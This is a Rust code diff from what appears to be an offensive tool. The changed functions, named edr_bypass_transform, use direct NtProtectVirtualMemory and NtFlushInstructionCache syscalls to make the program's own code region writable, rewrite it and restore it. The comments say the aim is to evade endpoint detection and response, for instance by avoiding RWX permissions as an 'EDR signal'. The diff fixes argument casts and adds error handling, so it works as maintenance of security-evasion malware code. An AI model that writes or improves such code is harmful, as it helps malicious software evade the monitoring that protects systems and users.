@@ -278,7 +278,7 @@ fn find_pattern_offsets(data: &[u8], pattern: &[u8]) -> Vec<usize> {
     }
     data.windows(pattern.len())
         .enumerate()
-        .filter(|(_, w)| w == pattern)
+        .filter(|(_, w)| *w == pattern)
         .map(|(i, _)| i)
         .collect()
 }
@@ -978,14 +978,19 @@ fn hash_text(text: &[u8]) -> String {
 #[cfg(windows)]
 unsafe fn make_region_writable(base: usize, size: usize) -> Result<u32> {
     let mut old_protect: u32 = 0;
+    let mut region_base = base as *mut std::ffi::c_void;
+    let mut region_size = size;
     let status = crate::syscall!(
         "NtProtectVirtualMemory",
         (-1i64) as u64, // NtCurrentProcess()
-        &mut (base as *mut std::ffi::c_void),
-        &mut (size as usize),
-        0x04u32, // PAGE_READWRITE — never RWX (EDR signal)
-        &mut old_protect,
-    );
+        &mut region_base as *mut _ as u64,
+        &mut region_size as *mut _ as u64,
+        0x04u32 as u64, // PAGE_READWRITE — never RWX (EDR signal)
+        &mut old_protect as *mut _ as u64,
+    )
+    .map_err(|e| anyhow::anyhow!(
+        "edr_bypass_transform: NtProtectVirtualMemory resolution failed: {e}"
+    ))?;
     if status != 0 {
         bail!(
             "edr_bypass_transform: NtProtectVirtualMemory failed: 0x{status:08X}"
@@ -998,14 +1003,19 @@ unsafe fn make_region_writable(base: usize, size: usize) -> Result<u32> {
 #[cfg(windows)]
 unsafe fn restore_protection(base: usize, size: usize, original: u32) -> Result<()> {
     let mut old_protect: u32 = 0;
+    let mut region_base = base as *mut std::ffi::c_void;
+    let mut region_size = size;
     let status = crate::syscall!(
         "NtProtectVirtualMemory",
         (-1i64) as u64, // NtCurrentProcess()
-        &mut (base as *mut std::ffi::c_void),
-        &mut (size as usize),
-        original,
-        &mut old_protect,
-    );
+        &mut region_base as *mut _ as u64,
+        &mut region_size as *mut _ as u64,
+        original as u64,
+        &mut old_protect as *mut _ as u64,
+    )
+    .map_err(|e| anyhow::anyhow!(
+        "edr_bypass_transform: NtProtectVirtualMemory resolution failed: {e}"
+    ))?;
     if status != 0 {
         bail!(
             "edr_bypass_transform: NtProtectVirtualMemory restore failed: 0x{status:08X}"
@@ -1249,12 +1259,20 @@ pub fn run_edr_bypass_transform(max_transforms: u32, entropy_threshold: f64) -> 
     // Step 10: Flush instruction cache (Windows).
     #[cfg(windows)]
     {
-        let status = crate::syscall!(
+        let status = match crate::syscall!(
             "NtFlushInstructionCache",
-            std::ptr::null_mut::<std::ffi::c_void>(), // current process
-            text_ptr as *mut std::ffi::c_void,
-            text_size,
-        );
+            std::ptr::null_mut::<std::ffi::c_void>() as u64, // current process
+            text_ptr as *mut std::ffi::c_void as u64,
+            text_size as u64,
+        ) {
+            Ok(status) => status,
+            Err(e) => {
+                log::warn!(
+                    "edr_bypass_transform: NtFlushInstructionCache resolution failed: {e}"
+                );
+                0
+            }
+        };
         if status != 0 {
             log::warn!("edr_bypass_transform: NtFlushInstructionCache returned 0x{status:08X}");
         }
